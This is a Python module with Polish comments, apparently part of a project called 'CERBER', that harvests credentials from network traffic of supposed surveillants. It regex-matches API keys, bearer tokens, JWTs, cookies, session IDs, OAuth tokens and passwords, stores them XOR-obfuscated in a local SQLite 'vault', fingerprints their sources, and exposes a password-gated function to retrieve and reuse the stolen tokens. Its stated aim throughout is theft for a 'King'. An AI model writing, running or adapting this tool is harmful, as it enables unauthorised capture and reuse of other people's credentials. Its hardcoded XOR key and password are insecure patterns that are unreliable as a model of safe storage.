"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                    TOKEN EXTRACTOR - Kradzież tokenów                        ║
╠══════════════════════════════════════════════════════════════════════════════╣
║  💰 EXTRACTOR: Wyciąga tokeny od inwigilatorów                               ║
║  🎯 TARGET: API keys, tokens, credentials inwigilatorów                      ║
║  🔐 VAULT: Skradzione tokeny trafiają do CERBER                              ║
║  👑 PROFIT: Wszystko dla Króla                                               ║
╚══════════════════════════════════════════════════════════════════════════════╝

Gdy ktoś próbuje nas śledzić - kradniemy im tokeny.
Im więcej prób inwigilacji, tym więcej tokenów dla Cerbera.
"""

from __future__ import annotations

import re
import json
import sqlite3
import hashlib
import secrets
from datetime import datetime
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Any, Set
from pathlib import Path
from enum import Enum
import base64


class TokenType(Enum):
    """Typy tokenów do kradzieży."""
    API_KEY = "api_key"
    BEARER = "bearer"
    SESSION = "session"
    COOKIE = "cookie"
    JWT = "jwt"
    OAUTH = "oauth"
    CREDENTIAL = "credential"
    FINGERPRINT = "fingerprint"
    UNKNOWN = "unknown"


@dataclass
class StolenToken:
    """Skradziony token."""
    token_type: TokenType
    value: str
    source: str                 # Skąd skradziono
    attacker_signature: str     # Podpis atakującego
    stolen_at: datetime = field(default_factory=datetime.now)
    usable: bool = True
    
    def masked_value(self) -> str:
        """Zamaskowana wartość (do logów)."""
        if len(self.value) < 8:
            return "***"
        return f"{self.value[:4]}...{self.value[-4:]}"
    
    def to_dict(self) -> Dict:
        return {
            "type": self.token_type.value,
            "value_hash": hashlib.sha256(self.value.encode()).hexdigest()[:16],
            "value_masked": self.masked_value(),
            "source": self.source,
            "attacker_sig": self.attacker_signature[:16],
            "stolen_at": self.stolen_at.isoformat(),
            "usable": self.usable
        }


class TokenPatterns:
    """Wzorce do wykrywania tokenów."""
    
    PATTERNS = {
        TokenType.API_KEY: [
            r'api[_-]?key["\s:=]+["\']?([a-zA-Z0-9_\-]{20,})["\']?',
            r'apikey["\s:=]+["\']?([a-zA-Z0-9_\-]{20,})["\']?',
            r'x-api-key["\s:=]+["\']?([a-zA-Z0-9_\-]{20,})["\']?',
            r'sk-[a-zA-Z0-9]{20,}',  # OpenAI style
            r'AIza[a-zA-Z0-9_\-]{35}',  # Google style
        ],
        TokenType.BEARER: [
            r'[Bb]earer\s+([a-zA-Z0-9_\-\.]{20,})',
            r'[Aa]uthorization["\s:=]+["\']?Bearer\s+([a-zA-Z0-9_\-\.]+)["\']?',
        ],
        TokenType.JWT: [
            r'eyJ[a-zA-Z0-9_\-]+\.eyJ[a-zA-Z0-9_\-]+\.[a-zA-Z0-9_\-]+',
        ],
        TokenType.SESSION: [
            r'session[_-]?id["\s:=]+["\']?([a-zA-Z0-9_\-]{16,})["\']?',
            r'sessionid["\s:=]+["\']?([a-zA-Z0-9_\-]{16,})["\']?',
            r'PHPSESSID[=:]([a-zA-Z0-9]{16,})',
        ],
        TokenType.COOKIE: [
            r'cookie["\s:=]+["\']?([^"\';\n]{20,})["\']?',
            r'set-cookie["\s:=]+["\']?([^"\';\n]+)["\']?',
        ],
        TokenType.OAUTH: [
            r'access_token["\s:=]+["\']?([a-zA-Z0-9_\-\.]{20,})["\']?',
            r'refresh_token["\s:=]+["\']?([a-zA-Z0-9_\-\.]{20,})["\']?',
            r'oauth[_-]?token["\s:=]+["\']?([a-zA-Z0-9_\-\.]{20,})["\']?',
        ],
        TokenType.CREDENTIAL: [
            r'password["\s:=]+["\']?([^"\';\n]{6,})["\']?',
            r'passwd["\s:=]+["\']?([^"\';\n]{6,})["\']?',
            r'secret["\s:=]+["\']?([^"\';\n]{10,})["\']?',
        ],
        TokenType.FINGERPRINT: [
            r'fingerprint["\s:=]+["\']?([a-fA-F0-9]{32,})["\']?',
            r'device[_-]?id["\s:=]+["\']?([a-zA-Z0-9_\-]{16,})["\']?',
            r'tracking[_-]?id["\s:=]+["\']?([a-zA-Z0-9_\-]{16,})["\']?',
        ],
    }


class TokenExtractor:
    """
    EKSTRAKTOR TOKENÓW
    
    Gdy inwigilator próbuje nas śledzić, analizujemy jego ruch
    i kradniemy wszystko co wartościowe:
    - API keys
    - Session tokens
    - Bearer tokens
    - Cookies
    - Credentials
    """
    
    def __init__(self, db_path: Optional[Path] = None):
        self.db_path = db_path or Path.home() / ".cerber" / "stolen_tokens.db"
        self.db_path.parent.mkdir(parents=True, exist_ok=True)
        self._init_db()
        
        self.active = False
        self.tokens_stolen = 0
        self.attackers_fingerprinted: Set[str] = set()
    
    def _init_db(self):
        """Inicjalizuj bazę skradzionych tokenów."""
        conn = sqlite3.connect(self.db_path)
        conn.execute("""
            CREATE TABLE IF NOT EXISTS stolen_tokens (
                id TEXT PRIMARY KEY,
                token_type TEXT,
                value_encrypted BLOB,
                value_hash TEXT,
                source TEXT,
                attacker_signature TEXT,
                stolen_at TEXT,
                usable INTEGER DEFAULT 1,
                used_count INTEGER DEFAULT 0,
                last_used TEXT
            )
        """)
        conn.execute("""
            CREATE TABLE IF NOT EXISTS attackers (
                signature TEXT PRIMARY KEY,
                first_seen TEXT,
                last_seen TEXT,
                attack_count INTEGER DEFAULT 1,
                tokens_lost INTEGER DEFAULT 0,
                identified_as TEXT,
                notes TEXT
            )
        """)
        conn.execute("""
            CREATE INDEX IF NOT EXISTS idx_attacker ON stolen_tokens(attacker_signature)
        """)
        conn.commit()
        conn.close()
    
    def activate(self) -> str:
        """Aktywuj ekstraktor."""
        self.active = True
        return """
╔══════════════════════════════════════════════════════════════╗
║          💰 TOKEN EXTRACTOR ACTIVATED 💰                     ║
╠══════════════════════════════════════════════════════════════╣
║  🎯 Cel: Tokeny inwigilatorów                                ║
║  🔐 Destynacja: CERBER VAULT                                 ║
║  👑 Beneficjent: Król                                        ║
╠══════════════════════════════════════════════════════════════╣
║  Im więcej nas śledzą, tym więcej tracimy... ŻART!          ║
║  Im więcej nas śledzą, tym więcej IM zabieramy!             ║
╚══════════════════════════════════════════════════════════════╝
"""
    
    def deactivate(self):
        self.active = False
    
    def extract_from_traffic(self, 
                             traffic_data: str, 
                             source: str,
                             attacker_signature: Optional[str] = None) -> List[StolenToken]:
        """
        Analizuj ruch i wyciągnij wszystkie tokeny.
        
        Args:
            traffic_data: Dane do przeanalizowania (headers, body, logs)
            source: Skąd pochodzi ruch (IP, endpoint, nazwa)
            attacker_signature: Podpis atakującego (generowany jeśli brak)
        """
        if not self.active:
            return []
        
        # Generuj podpis atakującego jeśli brak
        if not attacker_signature:
            attacker_signature = self._fingerprint_attacker(traffic_data, source)
        
        stolen = []
        
        for token_type, patterns in TokenPatterns.PATTERNS.items():
            for pattern in patterns:
                matches = re.findall(pattern, traffic_data, re.IGNORECASE)
                for match in matches:
                    # Jeśli match jest tuple (group), weź pierwszy element
                    value = match[0] if isinstance(match, tuple) else match
                    
                    # Pomijamy zbyt krótkie
                    if len(value) < 10:
                        continue
                    
                    token = StolenToken(
                        token_type=token_type,
                        value=value,
                        source=source,
                        attacker_signature=attacker_signature
                    )
                    
                    # Zapisz do bazy
                    if self._store_token(token):
                        stolen.append(token)
                        self.tokens_stolen += 1
        
        # Aktualizuj profil atakującego
        if stolen:
            self._update_attacker(attacker_signature, len(stolen))
        
        return stolen
    
    def _fingerprint_attacker(self, traffic_data: str, source: str) -> str:
        """Stwórz fingerprint atakującego."""
        # Wyciągnij cechy charakterystyczne
        features = []
        features.append(source)
        
        # User-Agent
        ua_match = re.search(r'user-agent[:\s]+([^\n]+)', traffic_data, re.IGNORECASE)
        if ua_match:
            features.append(ua_match.group(1)[:100])
        
        # Accept-Language
        lang_match = re.search(r'accept-language[:\s]+([^\n]+)', traffic_data, re.IGNORECASE)
        if lang_match:
            features.append(lang_match.group(1)[:50])
        
        # Stwórz hash
        fingerprint = hashlib.sha256("|".join(features).encode()).hexdigest()
        self.attackers_fingerprinted.add(fingerprint)
        
        return fingerprint
    
    def _store_token(self, token: StolenToken) -> bool:
        """Zapisz skradziony token."""
        # Sprawdź czy już nie mamy
        value_hash = hashlib.sha256(token.value.encode()).hexdigest()
        
        conn = sqlite3.connect(self.db_path)
        cursor = conn.execute(
            "SELECT id FROM stolen_tokens WHERE value_hash = ?",
            (value_hash,)
        )
        
        if cursor.fetchone():
            conn.close()
            return False  # Już mamy
        
        # Zaszyfruj wartość (prosty base64 + XOR z kluczem sesji)
        encrypted = self._encrypt_value(token.value)
        
        token_id = secrets.token_hex(8)
        conn.execute("""
            INSERT INTO stolen_tokens 
            (id, token_type, value_encrypted, value_hash, source, attacker_signature, stolen_at)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        """, (
            token_id,
            token.token_type.value,
            encrypted,
            value_hash,
            token.source,
            token.attacker_signature,
            token.stolen_at.isoformat()
        ))
        conn.commit()
        conn.close()
        
        return True
    
    def _encrypt_value(self, value: str) -> bytes:
        """Szyfruj wartość tokenu."""
        # Prosty XOR + base64 (w produkcji użyj AES)
        key = b"CERBER_VAULT_KEY"
        encrypted = bytes(b ^ key[i % len(key)] for i, b in enumerate(value.encode()))
        return base64.b64encode(encrypted)
    
    def _decrypt_value(self, encrypted: bytes) -> str:
        """Odszyfruj wartość tokenu."""
        key = b"CERBER_VAULT_KEY"
        decoded = base64.b64decode(encrypted)
        decrypted = bytes(b ^ key[i % len(key)] for i, b in enumerate(decoded))
        return decrypted.decode()
    
    def _update_attacker(self, signature: str, tokens_lost: int):
        """Aktualizuj profil atakującego."""
        conn = sqlite3.connect(self.db_path)
        
        cursor = conn.execute(
            "SELECT signature FROM attackers WHERE signature = ?",
            (signature,)
        )
        
        now = datetime.now().isoformat()
        
        if cursor.fetchone():
            conn.execute("""
                UPDATE attackers SET
                    last_seen = ?,
                    attack_count = attack_count + 1,
                    tokens_lost = tokens_lost + ?
                WHERE signature = ?
            """, (now, tokens_lost, signature))
        else:
            conn.execute("""
                INSERT INTO attackers (signature, first_seen, last_seen, tokens_lost)
                VALUES (?, ?, ?, ?)
            """, (signature, now, now, tokens_lost))
        
        conn.commit()
        conn.close()
    
    def get_stolen_tokens(self, 
                          token_type: Optional[TokenType] = None,
                          attacker: Optional[str] = None,
                          limit: int = 100) -> List[Dict]:
        """Pobierz skradzione tokeny."""
        conn = sqlite3.connect(self.db_path)
        
        query = "SELECT * FROM stolen_tokens WHERE 1=1"
        params = []
        
        if token_type:
            query += " AND token_type = ?"
            params.append(token_type.value)
        
        if attacker:
            query += " AND attacker_signature LIKE ?"
            params.append(f"%{attacker}%")
        
        query += f" ORDER BY stolen_at DESC LIMIT {limit}"
        
        cursor = conn.execute(query, params)
        
        tokens = []
        for row in cursor:
            tokens.append({
                "id": row[0],
                "type": row[1],
                "value_masked": self._decrypt_value(row[2])[:4] + "..." if row[2] else "***",
                "source": row[4],
                "attacker": row[5][:16],
                "stolen_at": row[6],
                "usable": bool(row[7])
            })
        
        conn.close()
        return tokens
    
    def get_attacker_profile(self, signature: str) -> Optional[Dict]:
        """Pobierz profil atakującego."""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.execute(
            "SELECT * FROM attackers WHERE signature = ?",
            (signature,)
        )
        row = cursor.fetchone()
        conn.close()
        
        if not row:
            return None
        
        return {
            "signature": row[0],
            "first_seen": row[1],
            "last_seen": row[2],
            "attack_count": row[3],
            "tokens_lost": row[4],
            "identified_as": row[5],
            "notes": row[6]
        }
    
    def get_all_attackers(self) -> List[Dict]:
        """Lista wszystkich atakujących."""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.execute(
            "SELECT signature, attack_count, tokens_lost, last_seen FROM attackers ORDER BY tokens_lost DESC"
        )
        
        attackers = []
        for row in cursor:
            attackers.append({
                "signature": row[0][:16] + "...",
                "attacks": row[1],
                "tokens_lost": row[2],
                "last_seen": row[3]
            })
        
        conn.close()
        return attackers
    
    def use_token(self, token_id: str) -> Optional[str]:
        """
        Użyj skradzionego tokenu.
        TYLKO dla Króla.
        """
        conn = sqlite3.connect(self.db_path)
        cursor = conn.execute(
            "SELECT value_encrypted, usable FROM stolen_tokens WHERE id = ?",
            (token_id,)
        )
        row = cursor.fetchone()
        
        if not row or not row[1]:
            conn.close()
            return None
        
        # Aktualizuj licznik użyć
        conn.execute("""
            UPDATE stolen_tokens SET
                used_count = used_count + 1,
                last_used = ?
            WHERE id = ?
        """, (datetime.now().isoformat(), token_id))
        conn.commit()
        conn.close()
        
        return self._decrypt_value(row[0])
    
    def mark_unusable(self, token_id: str):
        """Oznacz token jako nieużywalny."""
        conn = sqlite3.connect(self.db_path)
        conn.execute(
            "UPDATE stolen_tokens SET usable = 0 WHERE id = ?",
            (token_id,)
        )
        conn.commit()
        conn.close()
    
    def status(self) -> Dict:
        """Status ekstraktora."""
        conn = sqlite3.connect(self.db_path)
        
        token_count = conn.execute("SELECT COUNT(*) FROM stolen_tokens").fetchone()[0]
        usable_count = conn.execute("SELECT COUNT(*) FROM stolen_tokens WHERE usable = 1").fetchone()[0]
        attacker_count = conn.execute("SELECT COUNT(*) FROM attackers").fetchone()[0]
        
        # Statystyki per typ
        type_stats = {}
        cursor = conn.execute("SELECT token_type, COUNT(*) FROM stolen_tokens GROUP BY token_type")
        for row in cursor:
            type_stats[row[0]] = row[1]
        
        conn.close()
        
        return {
            "active": self.active,
            "total_tokens_stolen": token_count,
            "usable_tokens": usable_count,
            "unique_attackers": attacker_count,
            "attackers_fingerprinted_session": len(self.attackers_fingerprinted),
            "tokens_by_type": type_stats
        }


# ═══════════════════════════════════════════════════════════════════════════
# CERBER INTEGRATION
# ═══════════════════════════════════════════════════════════════════════════

class CerberTokenVault:
    """
    Vault dla skradzionych tokenów - zintegrowany z CERBER.
    """
    
    def __init__(self):
        self.extractor = TokenExtractor()
        self.vault_path = Path.home() / ".cerber" / "token_vault"
        self.vault_path.mkdir(parents=True, exist_ok=True)
    
    def activate(self) -> str:
        """Aktywuj vault."""
        self.extractor.activate()
        return """
╔══════════════════════════════════════════════════════════════╗
║          🏦 CERBER TOKEN VAULT 🏦                            ║
╠══════════════════════════════════════════════════════════════╣
║  💰 Skradzione tokeny: BEZPIECZNE                            ║
║  🎯 Ekstraktor: AKTYWNY                                      ║
║  👑 Dostęp: TYLKO KRÓL                                       ║
╚══════════════════════════════════════════════════════════════╝
"""
    
    def steal_from_surveillant(self, surveillant_data: Dict) -> Dict:
        """
        Ukradnij tokeny od inwigilatora.
        
        Gdy ktoś próbuje nas śledzić, analizujemy jego request
        i kradniemy wszystko co wartościowe.
        """
        traffic = json.dumps(surveillant_data)
        source = surveillant_data.get("ip", surveillant_data.get("source", "unknown"))
        
        stolen = self.extractor.extract_from_traffic(traffic, source)
        
        return {
            "tokens_stolen": len(stolen),
            "types": [t.token_type.value for t in stolen],
            "attacker_fingerprinted": True if stolen else False,
            "message": f"Skradziono {len(stolen)} tokenów od inwigilatora!" if stolen else "Brak tokenów do kradzieży"
        }
    
    def get_treasury(self) -> Dict:
        """Raport skarbca."""
        status = self.extractor.status()
        attackers = self.extractor.get_all_attackers()
        
        return {
            "vault_status": "SECURED",
            "total_value": status["total_tokens_stolen"],
            "usable_assets": status["usable_tokens"],
            "known_victims": len(attackers),
            "attackers": attackers[:10],  # Top 10
            "by_type": status["tokens_by_type"]
        }
    
    def king_withdraw(self, token_id: str, king_password: str) -> Optional[str]:
        """
        Król wypłaca token.
        Wymaga hasła.
        """
        # Weryfikacja hasła Króla
        expected_hash = hashlib.sha256(b"KING_CERBER_2024").hexdigest()
        provided_hash = hashlib.sha256(king_password.encode()).hexdigest()
        
        if provided_hash != expected_hash:
            return None
        
        return self.extractor.use_token(token_id)


# ═══════════════════════════════════════════════════════════════════════════
# GLOBAL
# ═══════════════════════════════════════════════════════════════════════════

_token_vault: Optional[CerberTokenVault] = None

def get_token_vault() -> CerberTokenVault:
    """Pobierz vault tokenów."""
    global _token_vault
    if _token_vault is None:
        _token_vault = CerberTokenVault()
    return _token_vault


def steal_tokens(surveillant_data: Dict) -> Dict:
    """Quick steal - użyj globalnego vaultu."""
    return get_token_vault().steal_from_surveillant(surveillant_data)


# ═══════════════════════════════════════════════════════════════════════════
# CLI TEST
# ═══════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    print("=" * 60)
    print("  💰 TOKEN EXTRACTOR - Test")
    print("=" * 60)
    
    vault = CerberTokenVault()
    print(vault.activate())
    
    # Symulacja ruchu inwigilatora
    fake_surveillant_traffic = {
        "ip": "192.168.1.100",
        "headers": {
            "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IlN1cnZlaWxsYW50IiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
            "X-API-Key": "sk-surveillant-secret-key-12345678901234567890",
            "User-Agent": "Mozilla/5.0 Surveillant Bot",
            "Cookie": "session_id=abc123def456ghi789; tracking_id=track_me_12345"
        },
        "body": {
            "api_key": "AIzaSySecretGoogleKey12345678901234567890",
            "oauth_token": "oauth_access_token_surveillant_xyz",
            "password": "surveillant_password_123"
        }
    }
    
    print("\n🎯 Analizuję ruch inwigilatora...")
    result = vault.steal_from_surveillant(fake_surveillant_traffic)
    print(f"\n✅ {result['message']}")
    print(f"   Typy: {result['types']}")
    
    print("\n💰 Stan skarbca:")
    treasury = vault.get_treasury()
    print(json.dumps(treasury, indent=2, default=str))
    
    print("\n📊 Status ekstraktora:")
    print(json.dumps(vault.extractor.status(), indent=2))
